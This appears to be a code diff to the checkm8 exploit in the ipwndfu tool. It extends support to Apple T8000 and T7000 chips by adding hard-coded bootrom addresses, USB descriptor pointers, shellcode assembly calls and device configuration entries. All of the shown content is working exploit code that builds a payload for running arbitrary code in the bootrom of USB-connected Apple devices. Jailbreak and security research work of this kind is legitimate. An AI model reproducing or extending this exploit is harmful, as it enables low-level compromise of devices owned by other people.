@@ -235,6 +235,30 @@ def payload(cpid):
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
     return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
+  if cpid == 0x8000:
+    constants_usb_t8000 = [
+                0x48818000, # 1 - LOAD_ADDRESS
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                  0x9410+1, # 6 - USB_CORE_DO_IO
+    ]
+    constants_checkm8_t8000 = [
+                0x4880629C, # 1 - gUSBDescriptors
+                0x48802AB8, # 2 - gUSBSerialNumber
+                  0x8CA4+1, # 3 - usb_create_string_descriptor
+                0x4880037A, # 4 - gUSBSRNMStringDescriptor
+                0x48806E00, # 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x48806344, # 8 - PAYLOAD_PTR
+    ]
+    t8000_handler = asm_thumb_trampoline(0x48806E00+1, 0x95F0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t8000)[8:]
+    t8000_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8000)
+    assert len(t8000_shellcode) <= PAYLOAD_OFFSET_ARMV7
+    assert len(t8000_handler) <= PAYLOAD_SIZE_ARMV7
+    return t8000_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8000_shellcode)) + t8000_handler  
   if cpid == 0x8002:
     constants_usb_t8002 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -441,6 +465,8 @@ def all_exploit_configs():
     DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, None, None), # S5L8950 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, None, None), # S5L8955 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8960x_overwrite, None, None), # S5L8960 (buttons)     13.97 seconds
+    DeviceConfig('iBoot-1992.0.0.1.19',   0x7000, None,    t7000_overwrite,    5,    1), # T7000 (DFU loop)  NEW: 1.27 seconds 
+    DeviceConfig('iBoot-2234.0.0.3.3',    0x8000, None,    t800x_overwrite,    5,    1), # T8000 (DFU loop)  NEW: 1.27 seconds  
     DeviceConfig('iBoot-2651.0.0.1.31',   0x8002, None,    t800x_overwrite,    5,    1), # T8002 (DFU loop)  NEW: 1.27 seconds
     DeviceConfig('iBoot-2651.0.0.3.3',    0x8004, None,    t800x_overwrite,    5,    1), # T8004 (buttons)   NEW: 1.06 seconds
     DeviceConfig('iBoot-2696.0.0.1.33',   0x8010, None,    t8010_overwrite,    5,    1), # T8010 (buttons)   NEW: 0.68 seconds
